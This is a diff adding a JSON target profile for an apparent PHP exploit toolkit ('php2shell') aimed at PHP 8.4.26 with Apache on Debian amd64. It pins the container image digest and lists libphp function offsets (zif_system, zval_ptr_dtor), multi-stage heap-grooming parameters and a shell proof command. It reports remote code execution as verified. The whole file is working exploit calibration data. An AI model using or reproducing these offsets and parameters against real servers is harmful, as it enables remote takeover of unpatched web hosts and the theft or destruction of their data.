@@ -1,0 +1,47 @@
+{
+  "name": "php-8.4.26-apache-trixie-amd64",
+  "php_version": "8.4.26",
+  "branch": "8.4",
+  "fixed_in": "8.4.27",
+  "sapi": "apache2handler",
+  "arch": "amd64",
+  "distro": "debian-trixie",
+  "oci_tag": "8.4.26-apache",
+  "oci_manifest_digest": "sha256:b0ae0e0d4a3b7f0e800017482752b94f58ab049f2d7fcd108e5452afce3f50d1",
+  "libphp": {
+    "zif_system": "0x465370",
+    "zval_ptr_dtor": "0x65eb60"
+  },
+  "stage1_n": 841,
+  "stage1_forge_len": 63,
+  "stage2_t": 406,
+  "stage2_v": 16,
+  "stage3": {
+    "verified": true,
+    "mode": "carrier",
+    "htdata": "0x690d8",
+    "pads": [
+      [31, 31],
+      [31, 31],
+      [31, 31],
+      [31, 31],
+      [31, 31],
+      [31, 31]
+    ],
+    "cookie": true,
+    "attempts": 5
+  },
+  "proof_command": "id>/www/p",
+  "oom_mb": 12,
+  "verified_at": "2026-11-09",
+  "environment": {
+    "image": "official php:8.4.26-apache OCI layers built by build-oci.sh",
+    "apache": "image's own /usr/sbin/apache2 -DFOREGROUND (2.4.69 Debian), conf-enabled/zz-php2shell.conf single worker + KeepAlive Off",
+    "document_root": "/www",
+    "landing_page": "<?php echo \"OK\\n\";",
+    "php_ini": "conf.d/zz-php2shell.ini only (no php.ini; output_buffering=0; log_errors Off)",
+    "workers": 1
+  },
+  "notes": "Measured over HTTP with php2shell_calibrate.py's probe/sweep and its stage-3 carrier layout in a rootless user-namespace chroot running the pinned OCI image with the guest's exact Apache/php.ini. The amd64 pointer-range patch in amd64.py is required: with the toolkit's widened filter a valid 4096-byte leak parses as chunk=0x600000. Stage 3 proof: uid=33(www-data) fetched from /p. See RESULTS.md section 3.",
+  "status": "RCE verified on the exact pinned image"
+}
